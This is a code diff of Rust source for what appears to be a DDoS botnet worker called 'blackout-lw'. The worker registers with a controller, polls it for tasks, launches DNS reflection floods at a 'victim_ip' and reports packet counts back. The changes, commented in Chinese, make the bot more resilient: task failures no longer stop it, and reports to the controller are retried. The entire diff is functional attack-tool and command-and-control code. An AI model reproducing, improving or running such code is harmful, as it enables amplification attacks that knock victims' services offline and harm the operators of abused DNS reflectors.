@@ -54,7 +54,6 @@ pub fn run(cfg: &Config) -> Result<(), HError> {
     eprintln!("blackout-lw: registered as {node_id}");
 
     let stats = std::sync::Arc::new(Stats::default());
-    let mut last_report = std::time::Instant::now() - Duration::from_secs(60);
 
     loop {
         // 心跳（= 任务轮询）
@@ -87,13 +86,11 @@ pub fn run(cfg: &Config) -> Result<(), HError> {
         }
 
         if let Some(task) = hb.task {
-            run_task(cfg, &node_id, &task, &stats)?;
-        }
-
-        // 统计上报（3s 周期合并到下一次心跳前）
-        if last_report.elapsed() >= Duration::from_secs(3) {
-            let _ = report(cfg, &node_id, "", &stats);
-            last_report = std::time::Instant::now();
+            // 任务执行失败（拉池失败/完成上报丢失等）不退出主循环：
+            // 控制器端有超时重派兜底，进程保持心跳在线。
+            if let Err(e) = run_task(cfg, &node_id, &task, &stats) {
+                eprintln!("blackout-lw: task {} error: {e}", task.task_id);
+            }
         }
 
         std::thread::sleep(Duration::from_secs(cfg.heartbeat_secs));
@@ -158,22 +155,46 @@ fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<
         "blackout-lw: task {} dns_reflector -> {} ({}) threads={} dur={}s",
         task.task_id, task.target, fmt_ip(victim_ip), spec.threads, spec.duration_secs
     );
+    // 差值统计：Stats 跨任务累计，只上报本任务的增量包数
+    let p0 = stats.packets();
+    let b0 = stats.bytes();
+    let e0 = stats.errors();
     run_dns_reflection(&spec, std::sync::Arc::clone(stats));
-    report(cfg, node_id, &task.task_id, stats)?;
-    eprintln!("blackout-lw: task {} done (pkts={})", task.task_id, stats.packets());
-    Ok(())
+    let dp = stats.packets() - p0;
+    let db = stats.bytes() - b0;
+    let de = stats.errors() - e0;
+    eprintln!("blackout-lw: task {} done (pkts={})", task.task_id, dp);
+    // 完成上报：失败重试 3 次。上报丢失会让 Controller 任务超时重派、
+    // 整段重跑一遍完整时长，值得重试。
+    let mut last_err: Option<HError> = None;
+    for _ in 0..3 {
+        match report(cfg, node_id, &task.task_id, dp, db, de, stats.pps(), true) {
+            Ok(()) => return Ok(()),
+            Err(e) => {
+                last_err = Some(e);
+                std::thread::sleep(Duration::from_secs(2));
+            }
+        }
+    }
+    Err(HError(format!(
+        "report failed after retries: {}",
+        last_err.map(|e| e.0).unwrap_or_default()
+    )))
 }
 
-fn report(cfg: &Config, node_id: &str, task_id: &str, stats: &Stats) -> Result<(), HError> {
+fn report(
+    cfg: &Config,
+    node_id: &str,
+    task_id: &str,
+    packets: u64,
+    bytes: u64,
+    errors: u64,
+    pps: u64,
+    finished: bool,
+) -> Result<(), HError> {
     let body = format!(
-        r#"{{"token":"{}","node_id":"{}","task_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{}}}"#,
-        cfg.token,
-        node_id,
-        task_id,
-        stats.packets(),
-        stats.bytes(),
-        stats.errors(),
-        stats.pps(),
+        r#"{{"token":"{}","node_id":"{}","task_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{},"finished":{}}}"#,
+        cfg.token, node_id, task_id, packets, bytes, errors, pps, finished
     );
     let resp = http::post_json(&cfg.controller, "/api/lw/report", &cfg.token, &body, Duration::from_secs(10))?;
     if resp.status != 200 {
